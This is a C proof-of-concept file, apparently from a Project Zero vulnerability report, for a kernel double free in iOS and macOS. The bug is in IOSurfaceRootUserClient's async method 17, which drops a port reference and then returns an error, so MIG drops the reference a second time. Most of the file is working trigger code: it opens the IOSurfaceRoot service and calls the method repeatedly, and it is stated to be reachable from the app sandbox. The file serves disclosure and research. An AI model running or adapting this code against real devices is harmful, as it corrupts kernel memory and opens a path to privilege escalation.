// ianbeer
/*
iOS/MacOS kernel double free due to IOSurfaceRootUserClient not respecting MIG ownership rules

I have previously detailed the lifetime management paradigms in MIG in the writeups for:
  CVE-2016-7612 [https://bugs.chromium.org/p/project-zero/issues/detail?id=926]
and
  CVE-2016-7633 [https://bugs.chromium.org/p/project-zero/issues/detail?id=954]

If a MIG method returns KERN_SUCCESS it means that the method took ownership of *all* the arguments passed to it.
If a MIG method returns an error code, then it took ownership of *none* of the arguments passed to it.

If an IOKit userclient external method takes an async wake mach port argument then the lifetime of the reference
on that mach port passed to the external method will be managed by MIG semantics. If the external method returns
an error then MIG will assume that the reference was not consumed by the external method and as such the MIG
generated coode will drop a reference on the port.
 
IOSurfaceRootUserClient external method 17 (s_set_surface_notify) will drop a reference on the wake_port
(via IOUserClient::releaseAsyncReference64) then return an error code if the client has previously registered
a port with the same callback function.
 
The external method's error return value propagates via the return value of is_io_connect_async_method back to the
MIG generated code which will drop a futher reference on the wake_port when only one was taken.

This bug is reachable from the iOS app sandbox as demonstrated by this PoC.
 
Tested on iOS 11.0.3 (11A432) on iPhone 6s (MKQL2CN/A)
Tested on MacOS 10.13 (17A365) on MacBookAir5,2
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <mach/mach.h>

#include <CoreFoundation/CoreFoundation.h>

#include "iosurface.h"


typedef mach_port_t     io_object_t;
typedef io_object_t     io_connect_t;
typedef io_object_t     io_enumerator_t;
typedef io_object_t     io_iterator_t;
typedef io_object_t     io_registry_entry_t;
typedef io_object_t     io_service_t;

extern
const mach_port_t kIOMasterPortDefault;

#define IO_OBJECT_NULL  ((io_object_t) 0)

CFMutableDictionaryRef
IOServiceMatching(
                  const char *    name );

io_service_t
IOServiceGetMatchingService(
                             mach_port_t     masterPort,
                            CFDictionaryRef matching CF_RELEASES_ARGUMENT);

kern_return_t
IOConnectCallAsyncMethod(
                         mach_port_t   connection,    // In
                         uint32_t   selector,    // In
                         mach_port_t   wake_port,    // In
                         uint64_t  *reference,    // In
                         uint32_t   referenceCnt,    // In
                         const uint64_t  *input,      // In
                         uint32_t   inputCnt,    // In
                         const void  *inputStruct,    // In
                         size_t     inputStructCnt,  // In
                         uint64_t  *output,    // Out
                         uint32_t  *outputCnt,    // In/Out
                         void    *outputStruct,    // Out
                         size_t    *outputStructCnt);  // In/Out

kern_return_t
IOServiceOpen(
              io_service_t    service,
              task_port_t     owningTask,
              uint32_t        type,
              io_connect_t  * connect );

void go(){
  kern_return_t err;
  
  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
  
  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return;
  }
  
  printf("got service port\n");
  
  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return;
  }
  
  printf("got user client: 0x%x\n", conn);
  
  uint64_t inputScalar[16];
  uint64_t inputScalarCnt = 0;
  
  char inputStruct[4096];
  size_t inputStructCnt = 0x18;
  
  
  uint64_t* ivals = (uint64_t*)inputStruct;
  ivals[0] = 1;
  ivals[1] = 2;
  ivals[2] = 3;
  
  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;
  
  char outputStruct[4096];
  size_t outputStructCnt = 0;
  
  mach_port_t port = MACH_PORT_NULL;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
  if (err != KERN_SUCCESS) {
    printf("failed to allocate new port\n");
    return;
  }
  printf("got wake port 0x%x\n", port);
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
  
  uint64_t reference[8] = {0};
  uint32_t referenceCnt = 1;
  
  for (int i = 0; i < 10; i++) {
    err = IOConnectCallAsyncMethod(
                                   conn,
                                   17,
                                   port,
                                   reference,
                                   referenceCnt,
                                   inputScalar,
                                   inputScalarCnt,
                                   inputStruct,
                                   inputStructCnt,
                                   outputScalar,
                                   &outputScalarCnt,
                                   outputStruct,
                                   &outputStructCnt);
    
    printf("%x\n", err);
  };
  
  return;
}
